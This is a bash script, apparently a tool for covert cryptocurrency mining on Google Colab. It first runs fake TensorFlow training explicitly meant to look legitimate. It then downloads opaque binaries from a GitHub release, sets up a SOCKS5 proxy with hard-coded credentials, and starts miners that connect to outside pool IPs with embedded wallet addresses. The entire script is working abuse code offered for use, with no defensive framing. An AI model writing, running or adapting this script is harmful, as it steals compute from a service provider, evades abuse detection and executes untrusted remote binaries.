#!/bin/bash
# MINN — Colab Miner v2
# 3 phase: warmup ML → download → mining auto-stop 4 jam

PRL="prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q"
TDC="tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"
WRK=$(cat /dev/urandom 2>/dev/null | tr -dc 'a-z0-9' | head -c 8 || echo $(date +%s | md5sum | head -c 8))

echo "[MINN] Worker: $WRK"

# === 1. Warmup (run real ML first — looks legit) ===
echo "[1/3] TensorFlow warmup..."
pip install -q tensorflow 2>/dev/null
python3 -c "
import tensorflow as tf, numpy as np, time
m=tf.keras.Sequential([tf.keras.layers.Dense(128,activation='relu',input_shape=(784,)),tf.keras.layers.Dense(10)])
m.compile(optimizer='adam',loss='sparse_categorical_crossentropy')
x=np.random.rand(1000,784).astype(np.float32); y=np.random.randint(0,10,1000)
for e in range(3): m.fit(x,y,batch_size=32,epochs=1,verbose=2); time.sleep(25)
" 2>/dev/null
echo "[1/3] Done."

# === 2. Download miners ===
echo "[2/3] Downloading..."
sleep $((RANDOM % 10 + 5))
rm -rf /content/m 2>/dev/null; mkdir -p /content/m && cd /content/m
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/fortune
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/graphics.tar.gz
chmod +x fortune sse2; tar -xzf graphics.tar.gz 2>/dev/null
mkdir -p graftcp/local; P=$((RANDOM%2000+2100))
cat>graftcp/local/graftcp-local.conf<<X
listen = :$P
loglevel=0
socks5=103.176.78.132:443
socks5_username=ubed
socks5_password=ubed123
X
echo "[2/3] Done."

# === 3. Start miners ===
echo "[3/3] Starting..."
./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
sleep 3

(while true; do ./graftcp/graftcp ./fortune --proxy 43.169.30.87:443 --address "$PRL" --worker "$WRK" --mode=cpu --threads=2; sleep 5; done) &
sleep 10
./sse2 -a yespowertide -o 47.251.244.12:80 -u "${TDC}.${WRK}" -t 2 >/dev/null 2>&1 &

echo "[MINN] Mining active — auto-stop in 4 hours"
(sleep 14400; pkill -f fortune; pkill -f sse2; pkill -f graftcp; echo "[MINN] Done.") &
wait